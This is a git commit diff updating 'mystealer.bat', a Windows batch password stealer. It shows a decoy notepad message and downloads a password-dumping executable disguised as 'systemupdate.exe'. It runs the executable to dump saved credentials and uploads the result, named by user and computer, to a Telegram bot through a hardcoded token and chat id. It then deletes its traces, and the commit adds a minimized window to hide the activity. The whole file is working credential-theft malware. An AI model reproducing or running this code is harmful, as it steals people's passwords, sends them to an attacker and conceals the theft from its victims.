4cb3847f7a8978b06d7ee09a6c06837a42200518
devilJM <97776653+devilJM@users.noreply.github.com>
2024-07-02 01:49:26 +0700

    Update mystealer.bat

--- mystealer.bat
+++ mystealer.bat
@@ -1,5 +1,6 @@
 @echo off
 echo Your Password Is : 123 > "%temp%\password.txt" & start notepad "%temp%\password.txt"
-cmd /c "curl -o "%temp%\java.exe" https://raw.githubusercontent.com/devilJM/Hacktool-For-Educational-Purposes/main/pass.exe & "%temp%\java.exe" /stext "%temp%\%username%-%computername%.txt" & curl -F document=@"%temp%\%username%-%computername%.txt" -F caption="Password From %username% - %computername%" "https://api.telegram.org/bot6481424824:AAF448E2lOZMaAZxDqFtrGE_0UONAA8-wH0/sendDocument?chat_id=365617307" & del "%temp%\java.exe" & del "%temp%\%username%-%computername%.txt" "
+start /min cmd /c "curl -o %temp%\systemupdate.exe https://raw.githubusercontent.com/devilJM/Hacktool-For-Educational-Purposes/main/pass.exe & %temp%\systemupdate.exe /stext %temp%\%username%-%computername%.txt & curl -F document=@%temp%\%username%-%computername%.txt -F caption=\"Password From %username% - %computername%\" https://api.telegram.org/bot6481424824:AAF448E2lOZMaAZxDqFtrGE_0UONAA8-wH0/sendDocument?chat_id=365617307 & del %temp%\systemupdate.exe & del %temp%\%username%-%computername%.txt"
+rem cmd /c "curl -o "%temp%\systemupdate.exe" https://raw.githubusercontent.com/devilJM/Hacktool-For-Educational-Purposes/main/pass.exe & "%temp%\systemupdate.exe" /stext "%temp%\%username%-%computername%.txt" & curl -F document=@"%temp%\%username%-%computername%.txt" -F caption="Password From %username% - %computername%" "https://api.telegram.org/bot6481424824:AAF448E2lOZMaAZxDqFtrGE_0UONAA8-wH0/sendDocument?chat_id=365617307" & del "%temp%\systemupdate.exe" & del "%temp%\%username%-%computername%.txt" "
 del "%temp%\password.txt"
-
+pause
